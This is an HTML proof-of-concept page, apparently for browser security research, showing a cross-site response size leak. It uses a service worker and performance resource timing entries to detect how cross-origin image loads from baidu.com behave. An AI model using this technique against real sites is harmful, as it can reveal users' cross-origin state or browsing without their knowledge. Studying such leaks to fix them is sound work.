<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>
      if ("serviceWorker" in navigator) {
        addEventListener("load", async () => {
          performance.setResourceTimingBufferSize(1337);
          const registration = await navigator.serviceWorker.register("static/serviceworker.js");
          if (registration.installing)
            location.reload();
        });
      }

      function get(url, size) {
        let start = performance.getEntries().length;
        let element = document.createElement('img');
        element.src = `${url}?size=${size}`;

        element.onload = () => {
          let diff = performance.getEntries().length - start;
          document.getElementById('res').innerHTML += `<tr><td>${url}</td><td>${size}</td><td>onload</td><td>${diff}</td><tr>`;
          console.log(performance.getEntries());
        }
        element.onerror = () => {
          let diff = performance.getEntries().length - start;
          document.getElementById('res').innerHTML += `<tr><td>${url}</td><td>${size}</td><td>onerror</td><td>${diff}</td><tr>`;
          console.log(performance.getEntries());
        }
      }

      function run() {
        urls = [
          'https://www.baidu.com/robots.txt',
          'https://www.baidu.com/asdfas',
          'https://www.baidu.com/favicon.ico',
          'https://www.baidu.com/favicon.ico',
        ]
        sizes = [
          1,
          1,
          1,
          100000000,
        ]
        for (let i = 0; i < urls.length; i++) {
          setTimeout(get, (i + 1) * 1000, urls[i], sizes[i]);
        }
      }
      
      onload = () => {
        run();
      }

    </script>
  </head>

  <body>
    <table id="res">
      <tr>
        <th>URL</th>
        <th>Size</th>
        <th>Event</th>
        <th>Entries</th>
      </tr>
    </table>
  </body>

</html>
